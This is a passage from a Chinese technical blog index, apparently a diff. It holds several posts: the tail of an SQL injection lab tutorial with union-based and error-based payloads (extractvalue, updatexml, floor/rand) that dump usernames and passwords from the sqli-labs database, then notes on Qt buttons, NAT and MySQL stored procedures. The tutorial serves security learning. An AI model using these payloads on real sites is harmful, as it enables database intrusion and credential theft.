+<p>#指定表名<br>?id&#x3D;-1’ union select 1,2,group_concat(column_name) from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;’users’ –+<br>#或者指定当前数据库名<br>?id&#x3D;-1’ union select 1,2,group_concat(column_name) from information_schema.columns where table_schema&#x3D;’security’ and table_name&#x3D;’users’ –+<br>获取”users”表中存在3个字段，分别为 “id,username,password”<br>Your Login name:2<br>Your Password:id,username,password</p>
+<ol start="7">
+<li>爆相应字段的所有数据<br>有了表名，字段名<br>就可以组成一个完整的sql语句</li>
+</ol>
+<p>#指定表名和字段名<br>?id&#x3D;-1’ union select 1,2,group_concat(id,’:’,username,’:’,password) from users –+</p>
+<p>至此，联合查询整个过程结束。</p>
+<p>重点在于，注入的时候找到注入点后只需套入语句即可。</p>
+<p>报错注入<br>报错注入用在数据库的错误信息会回显在网页中的情况，如果联合查询不能使用，首选报错注入。<br>报错注入利用的是数据库的报错信息得到数据库的内容，这里需要构造语句让数据库报错。</p>
+<ol>
+<li><p>group by 重复键冲<br>and (select 1 from (select count(*),concat((select 查询的内容 from information_schema.tables limit 0,1),floor(rand()<em>2))x from information_schema.tables group by x)a) –+<br>提交如下，获取数据库名字<br>?id&#x3D;1’ and (select 1 from (select count(</em>),concat((select database() from information_schema.tables limit 0,1),floor(rand()*2))x from information_schema.tables group by x)a) –+</p>
+</li>
+<li><p>extractvalue() 函数<br>extractvalue() 是 MySQL 中用于从 XML 类型的数据中提取值的函数。它的基本语法如下：<br>extractvalue(xml_content, xpath_expr)<br>其中各个参数的含义如下：<br>xml_content: 是一个 XML 类型的列或者变量，表示要从中提取值的 XML 数据。<br>xpath_expr: 是一个 XPath 表达式，用来指定要提取的 XML 节点或者节点集合。<br>可以这样使用： extractvalue(1，函数)</p>
+</li>
+</ol>
+<p>?id&#x3D;1’ and extractvalue(1,concat(‘^’,(select database()),’^’)) –+<br>提交 ， 获取数据库名字<br>?id&#x3D;1’ and extractvalue(1,concat(‘^’,(select database()),’^’)) –+</p>
+<ol start="3">
+<li>updatexml() 函数<br>updatexml() 是 MySQL 数据库中的一个函数，用于更新 XML 类型的数据。它的基本语法如下：<br>updatexml(target_xml, xpath_expr, new_value)<br>其中各个参数的含义如下：<br>target_xml: 是一个 XML 类型的列或者变量，表示要更新的 XML 数据。<br>xpath_expr: 是一个 XPath 表达式，用来指定要更新的 XML 节点。<br>new_value: 是一个新的 XML 片段或者文本值，用来替换被选中的 XML 节点的值。<br>一般这样使用：updatexml(1,函数,1)</li>
+</ol>
+<p>使用：<br>and updatexml(1,concat(‘^’,(需要查询的内容),’^’),1)<br>（1） 提交如下，获取数据库名字<br>?id&#x3D;1’ and updatexml(1,concat(‘^’,(database()),’^’),1) –+<br>（2） 获取当前数据库中表的名字<br>?id&#x3D;1’ and updatexml(1,concat(‘^’,(select table_name from information_schema.tables where table_schema&#x3D;’security’ ),’^’),1) –+<br>这里是说要显示的内容超过一行它不能显示那么多，所以在 table_schema&#x3D;’security’ 后加上 limit 0,1，显示第一行（显示第0行的往下一行，不包括第0行）<br>?id&#x3D;1’ and updatexml(1,concat(‘^’,(select table_name from information_schema.tables where table_schema&#x3D;’security’  limit 0,1),’^’),1) –+<br>如果要看第二行则，limit1,1（第一行的往下一行，不包括第一行，即显示第二行），看第三行则limit2,1。以这个方法获取第四个表为users<br>（3） 爆表中的字段<br>?id&#x3D;1’ and updatexml(1,concat(‘^’,(select column_name from information_schema.columns where table_name&#x3D;’users’ and table_schema&#x3D;’security’ limit 0,1 ),’^’),1) –+<br>总共爆出的字段为： id , username , password<br>（4） 爆字段中的内容<br>?id&#x3D;1’ and updatexml(1,concat(‘^’,(select group_concat(username,”–”,password) from users limit 0,1 ),’^’),1) –+<br>三组用户名和密码。</p>
+<p>基于布尔的盲注<br>       布尔盲注，即在页面没有错误回显时完成的注入攻击。此时我们输入的语句让页面呈现出两种状态，相当于true和false，根据这两种状态可以判断我们输入的语句是否查询成功。<br>以less-8关为例</p>
+<ol>
+<li>我们输入正确的id，显示You are in …..</li>
+</ol>
+ 
+      <!-- reward -->
+      
+    </div>
+    
+
+    <!-- copyright -->
+    
+    <footer class="article-footer">
+       
+    </footer>
+  </div>
+
+   
+   
+  
+</article>
+
+    
+    <article
+  id="post-QT"
+  class="article article-type-post"
+  itemscope
+  itemprop="blogPost"
+  data-scroll-reveal
+>
+  <div class="article-inner">
+     
+    <div class="article-meta">
+      <a href="/2024/07/29/QT/" class="article-date">
+  <time datetime="2024-07-29T10:28:11.177Z" itemprop="datePublished">2024-07-29</time>
+</a>    
+    </div>
+      
+    <div class="article-entry" itemprop="articleBody">
+       
+  <p>创建一个按钮<br>QPushButtun * btn &#x3D; new QPushButtun;<br>btn-&gt;show();   &#x2F;&#x2F;show以顶层方式弹出窗口控件，单独弹出一个窗口</p>
+<p>btn-&gt;setParent(this);  &#x2F;&#x2F;让btn对象 依赖在myWidget中<br>btn-&gt;setText(“第一个按钮”);    &#x2F;&#x2F;设置按钮的文本信息<br>btn-&gt;move(100,100);     &#x2F;&#x2F;移动按钮<br>btn-&gt;resize(  );     &#x2F;&#x2F;重置按钮大小<br>方法二：<br>QPushButtun * btn &#x3D; new QPushButtun(“文本信息”,this);  &#x2F;&#x2F;两个参数，一个文本信息，一个设置父类<br>（可能会按照按钮的大小绘制窗口）</p>
+<p>重置窗口大小：<br>resize(600,400);<br>设置固定的窗口大小：<br>setFixedSize(600,400);<br>设置窗口标题：<br>setWindowTitle(“第一个窗口”);</p>
+<p>信号和槽<br>连接函数：connect<br>参数：1.信号的发送者 2.发送的信号（函数地址） 3.信号的接受者  4.处理的槽函数（函数的地址）<br>松散耦合<br>实现 点击按钮 关闭窗口的案例：<br>connect(btn, &amp;QPushButton::click, this ,&amp;QWidget::close);</p>
+<p>QKeyEvent</p>
+ 
+      <!-- reward -->
+      
+    </div>
+    
+
+    <!-- copyright -->
+    
+    <footer class="article-footer">
+       
+    </footer>
+  </div>
+
+   
+   
+  
+</article>
+
+    
+    <article
+  id="post-NAT"
+  class="article article-type-post"
+  itemscope
+  itemprop="blogPost"
+  data-scroll-reveal
+>
+  <div class="article-inner">
+     
+    <div class="article-meta">
+      <a href="/2024/07/29/NAT/" class="article-date">
+  <time datetime="2024-07-29T10:28:11.175Z" itemprop="datePublished">2024-07-29</time>
+</a>    
+    </div>
+      
+    <div class="article-entry" itemprop="articleBody">
+       
+  <h1 id="NAt是什么？？？"><a href="#NAt是什么？？？" class="headerlink" title="NAt是什么？？？"></a>NAt是什么？？？</h1><p><strong>1.1. NAT定义</strong></p>
+<p>NAT（Network Address Translator，网络地址转换）是用于在本地网络中使用私有地址，在连接互联网时转而使用全局 IP 地址的技术。NAT实际上是为解决<a href="https://link.zhihu.com/?target=https://bk.tw.lvfukeji.com/baike-IPv4%E4%BD%8D%E5%9D%80%E6%9E%AF%E7%AB%AD">IPv4地址短缺</a>而开发的技术。</p>
+<h2 id="1-2-NAT工作机制"><a href="#1-2-NAT工作机制" class="headerlink" title="1.2. NAT工作机制"></a><strong>1.2. NAT工作机制</strong></h2><p>如下图所示，以 10.0.0.10 的主机与 163.221.120.9 的主机进行通信为例讲解 NAT 的工作机制。利用 NAT，途中的 NAT 路由器将发送源地址从 10.0.0.10 转换为全局的 IP 地址（202.244.174.37）再发送数据。反之，当响应数据从 163.221.120.9 发送过来时，目标地址（202.244.174.37）先被转换成私有 IP 地址 10.0.0.10 以后再被转发。</p>
+<p><img src="/assets/v2-d95f93bf8b45d764fc3ebf2f1e4e0fc6_720w.webp" alt="img"></p>
+<p>NAT的工作机制</p>
+<p>在整个流程当中，最关键的有以下几点：</p>
+<ul>
+<li>网络被分为私网和公网两个部分，NAT网关设置在私网到公网的路由出口位置，双向流量必须都要经过NAT网关</li>
+<li>网络访问只能先由私网侧发起，公网无法主动访问私网主机</li>
+<li>NAT 路由器在两个访问方向上完成两次地址的转换或翻译，出方向做源信息替换，入方向做目的信息替换；</li>
+<li>NAT 路由器的存在对通信双方是保持透明的；</li>
+<li>NAT 路由器为了实现双向翻译的功能，需要维护一张<strong>关联表</strong>，把会话的信息保存下来。</li>
+</ul>
+<p><strong>问题：</strong></p>
+<p>当私有网络内的多台机器都要与外部进行通信时，仅仅靠转换 IP 地址的话就受限于是否有足够的全局 IP 地址可供使用。通过<strong>端口复用 NAPT</strong> 技术可以解决这个问题</p>
+<h2 id="1-3-NAT类型"><a href="#1-3-NAT类型" class="headerlink" title="1.3. NAT类型"></a><strong>1.3. NAT类型</strong></h2><p>NAT 有 3 中类型：静态NAT，动态NAT，端口复用NAPT</p>
+<h3 id="1-3-1-静态NAT"><a href="#1-3-1-静态NAT" class="headerlink" title="1.3.1. 静态NAT"></a><strong>1.3.1. 静态NAT</strong></h3><p>内部本地地址一对一转换成内部全局地址，相当内部本地的每一台PC都绑定了一个全局地址。一般用于在内网中对外提供服务的服务器</p>
+<h3 id="1-3-2-动态NAT"><a href="#1-3-2-动态NAT" class="headerlink" title="1.3.2. 动态NAT"></a><strong>1.3.2. 动态NAT</strong></h3><p>在内部本地地址转换的时候，在地址池中选择一个空闲的，没有正在被使用的地址，来进行转换，一般选择的是在地址池定义中排在前面的地址，当数据传输或者访问完成时就会放回地址池中，以供内部本地的其他主机使用，但是，如果这个地址正在被使用的时候，是不能被另外的主机拿来进行地址转换的</p>
+<h3 id="1-3-3-端口复用NAPT"><a href="#1-3-3-端口复用NAPT" class="headerlink" title="1.3.3. 端口复用NAPT"></a><strong>1.3.3. 端口复用NAPT</strong></h3><p>面对私网内部数量庞大的主机，如果NAT只进行IP地址的简单替换，就会产生一个问题：当有多个内部主机去访问同一个服务器时，从返回的信息不足以区分响应应该转发到哪个内部主机。此时，需要 NAT 设备根据传输层信息或其他上层协议去区分不同的会话，并且可能要对上层协议的标识进行转换，比如 TCP 或 UDP 端口号。这样 NAT 网关就可以将不同的内部连接访问映射到同一公网IP的不同传输层端口，通过这种方式实现公网IP的复用和解复用。这种方式也被称为端口转换PAT、NAPT或IP伪装，但更多时候直接被称为NAT，因为它是最典型的一种应用模式。</p>
+<p>如下图所示，以私网 10.0.0.10 和 10.0.0.11 的主机与外网 163.221.120.9 的主机进行通信为例讲解 NAPT 的工作机制。</p>
+<p><img src="/assets/v2-0d655d1871bcfbf7f2f1f28876636771_720w.webp" alt="img"></p>
+<p>端口复用NAPT的工作机制</p>
+<p>主机 163.221.120.9 的端口号是 80，私网中有 2 个客户端 10.0.0.10 和 10.0.0.11 同时进行通信，并且这 2 个客户端的本地端口都是 1025。此时，仅仅转换 IP 地址为全局地址 202.244.174.37 ，会令转换后的数字完全一致。因此，为了区分这 2 个会话，只要将 10.0.0.11 的端口号转换为 1026 就可以解决问题。NAPT 路由器通过生成转换表，就可以正确地转换地址跟端口的组合，使客户端A、B能同时与服务器之间进行通信。</p>
+<p><strong>关键点</strong>：利用端口号的唯一性实现了公网 IP 到私网 IP 的转换，理论上最多可以让 65535 台主机共用一个公网 IP 地址</p>
+<h2 id="1-4-NAT技术的优缺点"><a href="#1-4-NAT技术的优缺点" class="headerlink" title="1.4. NAT技术的优缺点"></a><strong>1.4. NAT技术的优缺点</strong></h2><h3 id="1-4-1-优点"><a href="#1-4-1-优点" class="headerlink" title="1.4.1. 优点"></a><strong>1.4.1. 优点</strong></h3><ul>
+<li>节省合法的公有 IP 地址（最大的优点）</li>
+<li>当网络发生变化时，避免重新编址。</li>
+<li>对外隐藏内部地址，增加网络安全性</li>
+</ul>
+<h3 id="1-4-2-缺点"><a href="#1-4-2-缺点" class="headerlink" title="1.4.2. 缺点"></a><strong>1.4.2. 缺点</strong></h3><ul>
+<li>无法从 NAT 的外部向内部服务器建立连接（NAT穿越）</li>
+<li>转换表的生成和转换操作都会产生一定的开销</li>
+<li>通信过程中一旦 NAT 遇到异常需重新启动时，所有的 TCP 连接都将被重置。即使备置两台 NAT 做容灾备份，TCP 连接还是会被断开。</li>
+</ul>
+ 
+      <!-- reward -->
+      
+    </div>
+    
+
+    <!-- copyright -->
+    
+    <footer class="article-footer">
+       
+    </footer>
+  </div>
+
+   
+   
+  
+</article>
+
+    
+    <article
+  id="post-Mysql_Pro"
+  class="article article-type-post"
+  itemscope
+  itemprop="blogPost"
+  data-scroll-reveal
+>
+  <div class="article-inner">
+     
+    <div class="article-meta">
+      <a href="/2024/07/29/Mysql_Pro/" class="article-date">
+  <time datetime="2024-07-29T10:28:11.174Z" itemprop="datePublished">2024-07-29</time>
+</a>    
+    </div>
+      
+    <div class="article-entry" itemprop="articleBody">
+       
+  <h1 id="存储过程"><a href="#存储过程" class="headerlink" title="存储过程"></a>存储过程</h1><p><strong>存储过程</strong>是事先经过编译并存储在数据库中的一段 SQL 语句的集合，调用存储过程可以简化应用开发人员的很多工作，减少数据在数据库和应用服务器之间的传输，对于提高数据处理的效率是有好处的。 </p>
+<p><strong>存储过程</strong>思想上很简单，就是数据库 SQL 语言层面的代码封装与重用</p>
+<p><strong>存储过程类似于编程里面的函数</strong></p>
+<h2 id="基本语法"><a href="#基本语法" class="headerlink" title="基本语法"></a>基本语法</h2><p>1). 创建 </p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span>  <span class="keyword">PROCEDURE</span>   存储过程名称 ([ 参数列表 ]) </span><br><span class="line"></span><br><span class="line"><span class="keyword">BEGIN</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- SQL语句 </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">END</span> ; </span><br></pre></td></tr></table></figure>
+
+<p>2). 调用 </p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CALL</span>  名称  ([ 参数 ]);  </span><br></pre></td></tr></table></figure>
+
+<p>3). 查看 </p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> INFORMATION_SCHEMA.ROUTINES <span class="keyword">WHERE</span> ROUTINE_SCHEMA <span class="operator">=</span> <span class="string">&#x27;xxx&#x27;</span>;  </span><br><span class="line"><span class="comment">-- 查询指定数据库的存储过程及状态信息 </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">SHOW</span>  <span class="keyword">CREATE</span>  <span class="keyword">PROCEDURE</span>   存储过程名称 ;  </span><br><span class="line"><span class="comment">-- 查询某个存储过程的定义 </span></span><br></pre></td></tr></table></figure>
+
+<p>4). 删除</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">DROP</span>  <span class="keyword">PROCEDURE</span>   [ IF <span class="keyword">EXISTS</span> ]  存储过程名称 </span><br></pre></td></tr></table></figure>
+
+<h2 id="演示示例："><a href="#演示示例：" class="headerlink" title="演示示例："></a>演示示例：</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 存储过程基本语法</span></span><br><span class="line"><span class="comment">-- 创建 </span></span><br><span class="line"><span class="keyword">create</span> <span class="keyword">procedure</span> p1() </span><br><span class="line"><span class="keyword">begin</span>    </span><br><span class="line">	<span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>) <span class="keyword">from</span> student; </span><br><span class="line"><span class="keyword">end</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 调用 </span></span><br><span class="line"><span class="keyword">call</span> p1();</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 查看 </span></span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> information_schema.ROUTINES <span class="keyword">where</span> ROUTINE_SCHEMA <span class="operator">=</span> <span class="string">&#x27;itcast&#x27;</span>; </span><br><span class="line"></span><br><span class="line"><span class="keyword">show</span> <span class="keyword">create</span> <span class="keyword">procedure</span> p1;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 删除 </span></span><br><span class="line"><span class="keyword">drop</span> <span class="keyword">procedure</span> if <span class="keyword">exists</span> p1</span><br></pre></td></tr></table></figure>
+
+<h1 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h1><p>在MySQL中变量分为三种类型: 系统变量、用户定义变量、局部变量。 </p>
+<h2 id="系统变量"><a href="#系统变量" class="headerlink" title="系统变量"></a>系统变量</h2><p>系统变量 是MySQL服务器提供，不是用户定义的，属于服务器层面。</p>
+<p>分为全局变量（GLOBAL）、会话 变量（SESSION）。 </p>
+<p>1). 查看系统变量</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SHOW</span>  [ SESSION <span class="operator">|</span> <span class="keyword">GLOBAL</span> ]   VARIABLES ;                    </span><br><span class="line"><span class="comment">-- 查看所有系统变量 </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">SHOW</span>  [ SESSION <span class="operator">|</span> <span class="keyword">GLOBAL</span> ]   VARIABLES  <span class="keyword">LIKE</span>  <span class="string">&#x27;......&#x27;</span>;     </span><br><span class="line"><span class="comment">-- 可以通过LIKE模糊匹配方 式查找变量 </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">SELECT</span>  @@[SESSION <span class="operator">|</span> <span class="keyword">GLOBAL</span>]  系统变量名;                    </span><br><span class="line"><span class="comment">--  查看指定变量的值</span></span><br></pre></td></tr></table></figure>
+
+<p>2).设置系统变量</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SET</span>  [ SESSION <span class="operator">|</span> <span class="keyword">GLOBAL</span> ]   系统变量名 <span class="operator">=</span> 值 ;  </span><br><span class="line"><span class="keyword">SET</span>  @@[SESSION <span class="operator">|</span> <span class="keyword">GLOBAL</span>]   系统变量名 <span class="operator">=</span> 值 ; </span><br></pre></td></tr></table></figure>
+
+<p><strong>注意:</strong>  </p>
+<p>​	如果没有指定SESSION&#x2F;GLOBAL，默认是SESSION，会话变量。  </p>
+<p>A. 全局变量(GLOBAL):   全局变量针对于所有的会话。 </p>
+<p>B. 会话变量(SESSION): 会话变量针对于单个会话，在另外一个会话窗口就不生效了。</p>
+<p>演示示例:   </p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 查看系统变量 show session variables ; </span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">show</span> session variables <span class="keyword">like</span> <span class="string">&#x27;auto%&#x27;</span>; </span><br><span class="line"></span><br><span class="line"><span class="keyword">show</span> <span class="keyword">global</span> variables <span class="keyword">like</span> <span class="string">&#x27;auto%&#x27;</span>; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> @<span class="variable">@global</span>.autocommit; </span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> @<span class="variable">@session</span>.autocommit;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 设置系统变量 </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">set</span> session autocommit <span class="operator">=</span> <span class="number">1</span>; </span><br><span class="line"></span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> course(id, name) <span class="keyword">VALUES</span> (<span class="number">6</span>, <span class="string">&#x27;ES&#x27;</span>); </span><br><span class="line"></span><br><span class="line"><span class="keyword">set</span> <span class="keyword">global</span> autocommit  <span class="operator">=</span> <span class="number">0</span>; </span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> @<span class="variable">@global</span>.autocommit；</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="用户定义变量"><a href="#用户定义变量" class="headerlink" title="用户定义变量"></a>用户定义变量</h2><p>用户定义变量 是用户根据需要自己定义的变量，用户变量不用提前声明，在用的时候直接用 “@变量 名” 使用就可以。其作用域为当前连接。 </p>
+<p>1). 赋值 </p>
+<p>方式一:  </p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SET</span>   <span class="variable">@var_name</span> <span class="operator">=</span> expr  [, <span class="variable">@var_name</span> <span class="operator">=</span> expr] ... ;  </span><br><span class="line"></span><br><span class="line"><span class="keyword">SET</span>   <span class="variable">@var_name</span> :<span class="operator">=</span> expr  [, <span class="variable">@var_name</span> :<span class="operator">=</span> expr] ... ; </span><br></pre></td></tr></table></figure>
+
+<p>赋值时，可以使用 &#x3D; ，也可以使用 :&#x3D; 。 </p>
+<p>方式二:  </p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span>   <span class="variable">@var_name</span> :<span class="operator">=</span> expr  [, <span class="variable">@var_name</span> :<span class="operator">=</span> expr] ... ;  </span><br><span class="line"></span><br><span class="line"><span class="keyword">SELECT</span>  字段名  <span class="keyword">INTO</span> <span class="variable">@var_name</span>  <span class="keyword">FROM</span>  表名; </span><br></pre></td></tr></table></figure>
+
+<p>2). 使用  </p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span>   <span class="variable">@var_name</span> ;</span><br></pre></td></tr></table></figure>
+
+<p>注意: 用户定义的变量无需对其进行声明或初始化，只不过获取到的值为NULL。  </p>
+<p>演示示例: </p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 赋值 </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">set</span> <span class="variable">@myname</span> <span class="operator">=</span> <span class="string">&#x27;itcast&#x27;</span>; </span><br><span class="line"></span><br><span class="line"><span class="keyword">set</span> <span class="variable">@myage</span> :<span class="operator">=</span> <span class="number">10</span>; </span><br><span class="line"></span><br><span class="line"><span class="keyword">set</span> <span class="variable">@mygender</span> :<span class="operator">=</span> <span class="string">&#x27;男&#x27;</span>,<span class="variable">@myhobby</span> :<span class="operator">=</span> <span class="string">&#x27;java&#x27;</span>; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> <span class="variable">@mycolor</span> :<span class="operator">=</span> <span class="string">&#x27;red&#x27;</span>; </span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>) <span class="keyword">into</span> <span class="variable">@mycount</span> <span class="keyword">from</span> tb_user;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 使用 </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> <span class="variable">@myname</span>,<span class="variable">@myage</span>,<span class="variable">@mygender</span>,<span class="variable">@myhobby</span>; </span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> <span class="variable">@mycolor</span> , <span class="variable">@mycount</span>;</span><br></pre></td></tr></table></figure>
+
+<h2 id="局部变量"><a href="#局部变量" class="headerlink" title="局部变量"></a>局部变量</h2><p>局部变量 是根据需要定义的在局部生效的变量，访问之前，需要DECLARE声明。可用作存储过程内的 局部变量和输入参数，局部变量的范围是在其内声明的BEGIN … END块。 </p>
+<p>1). 声明 </p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">DECLARE</span> 变量名 变量类型 [<span class="keyword">DEFAULT</span> ... ] ; </span><br></pre></td></tr></table></figure>
+
+<p>变量类型就是数据库字段类型：INT、BIGINT、CHAR、VARCHAR、DATE、TIME等。 </p>
+<p>2). 赋值  </p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SET</span>  变量名 <span class="operator">=</span> 值 ; </span><br><span class="line"></span><br><span class="line"><span class="keyword">SET</span>  变量名 :<span class="operator">=</span> 值 ; </span><br><span class="line"></span><br><span class="line"><span class="keyword">SELECT</span>  字段名  <span class="keyword">INTO</span>  变量名  <span class="keyword">FROM</span>  表名 ... ; </span><br></pre></td></tr></table></figure>
+
+<p>演示示例:  </p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 声明局部变量 - declare</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 赋值 </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">create</span> <span class="keyword">procedure</span> p2() </span><br><span class="line"></span><br><span class="line"><span class="keyword">begin</span></span><br><span class="line"></span><br><span class="line">​    <span class="keyword">declare</span> stu_count <span class="type">int</span> <span class="keyword">default</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">​    <span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>) <span class="keyword">into</span> stu_count <span class="keyword">from</span> student;</span><br><span class="line"></span><br><span class="line">​    <span class="keyword">select</span> stu_count; </span><br><span class="line"></span><br><span class="line"><span class="keyword">end</span>; </span><br><span class="line"></span><br><span class="line"><span class="keyword">call</span> p2();</span><br></pre></td></tr></table></figure>
+
+<h1 id="if"><a href="#if" class="headerlink" title="if"></a>if</h1><p>1). 介绍</p>
+<p>if 用于做条件判断，具体的语法结构为： </p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">IF  条件<span class="number">1</span>  <span class="keyword">THEN</span></span><br><span class="line"></span><br><span class="line">​     ..... </span><br><span class="line"></span><br><span class="line">ELSEIF  条件<span class="number">2</span>  <span class="keyword">THEN</span>       <span class="comment">-- 可选</span></span><br><span class="line"></span><br><span class="line">​    ..... </span><br><span class="line"></span><br><span class="line"><span class="keyword">ELSE</span>                     <span class="comment">-- 可选 </span></span><br><span class="line"></span><br><span class="line">   ..... </span><br><span class="line"></span><br><span class="line"><span class="keyword">END</span>  IF;</span><br></pre></td></tr></table></figure>
+
+<p>在if条件判断的结构中，ELSE IF 结构可以有多个，也可以没有。 ELSE结构可以有，也可以没有。  </p>
+<p>2). 案例 </p>
+<p>根据定义的分数score变量，判定当前分数对应的分数等级。 </p>
+<p>score &gt;&#x3D; 85分，等级为优秀。 </p>
+<p>score &gt;&#x3D; 60分 且 score &lt; 85分，等级为及格。 </p>
+<p>score &lt; 60分，等级为不及格。 </p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">procedure</span> p3() </span><br><span class="line"></span><br><span class="line"><span class="keyword">begin</span></span><br><span class="line"></span><br><span 